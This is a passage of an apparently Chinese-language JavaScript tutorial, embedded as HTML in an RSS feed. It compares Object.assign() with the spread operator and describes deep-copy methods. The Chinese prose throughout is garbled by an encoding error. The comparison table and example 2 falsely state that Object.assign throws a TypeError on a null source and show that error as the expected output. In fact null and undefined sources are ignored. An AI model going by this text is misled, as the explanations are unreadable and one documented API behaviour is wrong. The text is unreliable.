<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">name</span>); <span class="hljs-comment">// "å¼ ä¸‰" - ä¸å—å½±å“</span>
</code></pre>
<h2 data-id="heading-1">ä¸»è¦åŒºåˆ«å¯¹æ¯”è¡¨</h2>























































<table><thead><tr><th>ç‰¹æ€§</th><th><code>Object.assign()</code></th><th>æ‰©å±•è¿ç®—ç¬¦Â <code>...</code></th></tr></thead><tbody><tr><td><strong>è¯­æ³•</strong></td><td>å‡½æ•°å½¢å¼ï¼š<code>Object.assign(target, source1, source2...)</code></td><td>è¿ç®—ç¬¦ï¼š<code>{ ...source1, ...source2 }</code></td></tr><tr><td><strong>åˆå¹¶å¯¹è±¡</strong></td><td>æ”¯æŒå¤šä¸ªæºå¯¹è±¡</td><td>æ”¯æŒå¤šä¸ªæºå¯¹è±¡</td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td>è¿”å›ç›®æ ‡å¯¹è±¡</td><td>è¿”å›æ–°å¯¹è±¡</td></tr><tr><td><strong>åŸå‹é“¾å±æ€§</strong></td><td>ä¸å¤åˆ¶åŸå‹é“¾ä¸Šçš„å±æ€§</td><td>ä¸å¤åˆ¶åŸå‹é“¾ä¸Šçš„å±æ€§</td></tr><tr><td><strong>Symbolå±æ€§</strong></td><td>å¤åˆ¶Symbolå±æ€§</td><td>å¤åˆ¶Symbolå±æ€§</td></tr><tr><td><strong>å¯æšä¸¾æ€§</strong></td><td>åªå¤åˆ¶å¯æšä¸¾å±æ€§</td><td>åªå¤åˆ¶å¯æšä¸¾å±æ€§</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>ç›¸å¯¹è¾ƒæ…¢</td><td>ç›¸å¯¹è¾ƒå¿«ï¼ˆç°ä»£JSå¼•æ“ä¼˜åŒ–ï¼‰</td></tr><tr><td><strong>ç©ºå€¼å¤„ç†</strong></td><td><code>null</code>Â æˆ–Â <code>undefined</code>Â ä¼šæŠ¥é”™</td><td>ä¼šå¿½ç•¥Â <code>null</code>Â æˆ–Â <code>undefined</code></td></tr><tr><td><strong>å¯è¯»æ€§</strong></td><td>è¾ƒè€çš„æ–¹å¼ï¼Œä»£ç è¾ƒé•¿</td><td>æ›´ç°ä»£ï¼Œè¯­æ³•æ›´ç®€æ´</td></tr></tbody></table>
<h2 data-id="heading-2">è¯¦ç»†å¯¹æ¯”å’Œç¤ºä¾‹</h2>
<h3 data-id="heading-3">1. åŸºæœ¬ç”¨æ³•å·®å¼‚</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj1 = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> obj2 = { <span class="hljs-attr">c</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> };

<span class="hljs-comment">// Object.assign</span>
<span class="hljs-keyword">const</span> merged1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj1, obj2);
<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> merged2 = { ...obj1, ...obj2 };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(merged1); <span class="hljs-comment">// { a: 1, b: 2, c: 3, d: 4 }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(merged2); <span class="hljs-comment">// { a: 1, b: 2, c: 3, d: 4 }</span>
</code></pre>
<h3 data-id="heading-4">2. å¤„ç† null/undefined çš„åŒºåˆ«</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Object.assign é‡åˆ° null æˆ– undefined ä¼šæŠ¥é”™</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> result1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, <span class="hljs-literal">null</span>);
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e); <span class="hljs-comment">// TypeError: Cannot convert undefined or null to object</span>
}

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦ä¼šå¿½ç•¥ null æˆ– undefined</span>
<span class="hljs-keyword">const</span> result2 = { ...<span class="hljs-literal">null</span>, ...<span class="hljs-literal">undefined</span>, <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2); <span class="hljs-comment">// { a: 1 } - null/undefined è¢«å¿½ç•¥</span>
</code></pre>
<h3 data-id="heading-5">3. åˆå¹¶å¤šä¸ªå¯¹è±¡çš„å·®å¼‚</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> objA = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-keyword">const</span> objB = { <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> objC = { <span class="hljs-attr">c</span>: <span class="hljs-number">3</span> };

<span class="hljs-comment">// Object.assign - ç›´æ¥åˆå¹¶å¤šä¸ª</span>
<span class="hljs-keyword">const</span> mergedA = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, objA, objB, objC);

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦ - éœ€è¦æ˜¾å¼å±•å¼€å¤šä¸ª</span>
<span class="hljs-keyword">const</span> mergedB = { ...objA, ...objB, ...objC };

<span class="hljs-comment">// å¤æ‚åˆå¹¶ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> defaults = { <span class="hljs-attr">theme</span>: <span class="hljs-string">"dark"</span>, <span class="hljs-attr">fontSize</span>: <span class="hljs-number">14</span> };
<span class="hljs-keyword">const</span> userSettings = { <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span> };
<span class="hljs-keyword">const</span> override = { <span class="hljs-attr">theme</span>: <span class="hljs-string">"light"</span> };

<span class="hljs-comment">// ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥å®ç°é…ç½®åˆå¹¶</span>
<span class="hljs-keyword">const</span> settings1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, defaults, userSettings, override);
<span class="hljs-keyword">const</span> settings2 = { ...defaults, ...userSettings, ...override };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(settings1); <span class="hljs-comment">// { theme: "light", fontSize: 16 }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(settings2); <span class="hljs-comment">// { theme: "light", fontSize: 16 }</span>
</code></pre>
<h3 data-id="heading-6">4. åŸå‹é“¾å’Œä¸å¯æšä¸¾å±æ€§</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> proto = { <span class="hljs-attr">protoProp</span>: <span class="hljs-string">"proto"</span> };
<span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto, {
  <span class="hljs-attr">enumerableProp</span>: { <span class="hljs-attr">value</span>: <span class="hljs-string">"enumerable"</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">nonEnumerableProp</span>: { <span class="hljs-attr">value</span>: <span class="hljs-string">"non-enumerable"</span>, <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span> }
});

<span class="hljs-comment">// ä¸¤è€…éƒ½ä¸å¤åˆ¶åŸå‹é“¾å±æ€§å’Œä¸å¯æšä¸¾å±æ€§</span>
<span class="hljs-keyword">const</span> copy1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj);
<span class="hljs-keyword">const</span> copy2 = { ...obj };

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1); <span class="hljs-comment">// { enumerableProp: "enumerable" }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2); <span class="hljs-comment">// { enumerableProp: "enumerable" }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">protoProp</span>); <span class="hljs-comment">// undefined</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">protoProp</span>); <span class="hljs-comment">// undefined</span>
</code></pre>
<h3 data-id="heading-7">5. å¯¹æ•°ç»„çš„ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦å¯¹æ•°ç»„æ›´è‡ªç„¶</span>
<span class="hljs-keyword">const</span> arr1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>];

<span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦åˆå¹¶æ•°ç»„</span>
<span class="hljs-keyword">const</span> mergedArr1 = [...arr1, ...arr2];

<span class="hljs-comment">// Object.assign ä¹Ÿå¯ä»¥ç”¨äºæ•°ç»„ï¼Œä½†ä¸å¤ªç›´è§‚</span>
<span class="hljs-keyword">const</span> mergedArr2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>([], arr1, arr2);
<span class="hljs-comment">// æ³¨æ„ï¼šObject.assignç”¨äºæ•°ç»„æ—¶ï¼Œä¼šæŠŠæ•°ç»„å½“ä½œå¯¹è±¡å¤„ç†</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mergedArr1); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mergedArr2); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]</span>
</code></pre>
<h3 data-id="heading-8">6. æ€§èƒ½è€ƒè™‘</h3>
<p>åœ¨ç°ä»£ JavaScript å¼•æ“ä¸­ï¼Œæ‰©å±•è¿ç®—ç¬¦é€šå¸¸æ¯”Â <code>Object.assign()</code>Â æ€§èƒ½æ›´å¥½ï¼Œå°¤å…¶æ˜¯åœ¨åˆ›å»ºæ–°å¯¹è±¡æ—¶ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‰©å±•è¿ç®—ç¬¦é€šå¸¸æ›´å¿«</span>
<span class="hljs-keyword">const</span> data = { <span class="hljs-comment">/* å¤§é‡æ•°æ® */</span> };

<span class="hljs-comment">// æ–¹å¼1ï¼šæ‰©å±•è¿ç®—ç¬¦ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">const</span> fastCopy = { ...data };

<span class="hljs-comment">// æ–¹å¼2ï¼šObject.assign</span>
<span class="hljs-keyword">const</span> slowCopy = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, data);
</code></pre>
<h2 data-id="heading-9">å¦‚ä½•å®ç°æ·±æ‹·è´ï¼Ÿ</h2>
<p>å¦‚æœä½ éœ€è¦çœŸæ­£çš„æ·±æ‹·è´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<h3 data-id="heading-10">1. JSON æ–¹æ³•ï¼ˆæœ‰å±€é™æ€§ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(original));
<span class="hljs-comment">// ç¼ºç‚¹ï¼šä¸èƒ½å¤åˆ¶å‡½æ•°ã€Symbolã€undefinedã€å¾ªç¯å¼•ç”¨ç­‰</span>
</code></pre>
<h3 data-id="heading-11">2. é€’å½’å‡½æ•°</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span>) <span class="hljs-keyword">return</span> obj;
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) <span class="hljs-keyword">return</span> obj.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(item));
  
  <span class="hljs-keyword">const</span> cloned = {};
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
      cloned[key] = <span class="hljs-title function_">deepClone</span>(obj[key]);
    }
  }
  <span class="hljs-keyword">return</span> cloned;
}
</code></pre>
<h3 data-id="heading-12">3. ç¬¬ä¸‰æ–¹åº“</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Lodash</span>
<span class="hljs-keyword">const</span> cloned = _.<span class="hljs-title function_">cloneDeep</span>(original);

<span class="hljs-comment">// æˆ–ä½¿ç”¨ç°ä»£æµè§ˆå™¨å†…ç½®çš„APIï¼ˆå®éªŒæ€§ï¼‰</span>
<span class="hljs-keyword">const</span> cloned = <span class="hljs-title function_">structuredClone</span>(original);
</code></pre>
<h2 data-id="heading-13">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</strong>ï¼Œè¯­æ³•æ›´ç®€æ´ç›´è§‚</li>
<li><strong>æ˜ç¡®çŸ¥é“æ˜¯æµ…æ‹·è´</strong>ï¼Œä¸è¦è¯¯ä»¥ä¸ºæ˜¯æ·±æ‹·è´</li>
<li><strong>éœ€è¦æ·±æ‹·è´æ—¶</strong>ï¼Œæ ¹æ®éœ€æ±‚é€‰æ‹©åˆé€‚çš„æ·±æ‹·è´æ–¹æ¡ˆ</li>
<li><strong>åˆå¹¶é…ç½®æ—¶</strong>ï¼Œåé¢çš„å±æ€§ä¼šè¦†ç›–å‰é¢çš„ï¼ˆä¸¤è€…ç›¸åŒï¼‰</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> config = { ...defaultConfig, ...userConfig, ...overrideConfig };

<span class="hljs-comment">// æˆ–è€…å½“ç›®æ ‡å¯¹è±¡å·²å­˜åœ¨æ—¶ï¼Œä½¿ç”¨Object.assign</span>
<span class="hljs-keyword">const</span> existingObj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> };
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(existingObj, newProps); <span class="hljs-comment">// ä¿®æ”¹ç°æœ‰å¯¹è±¡</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>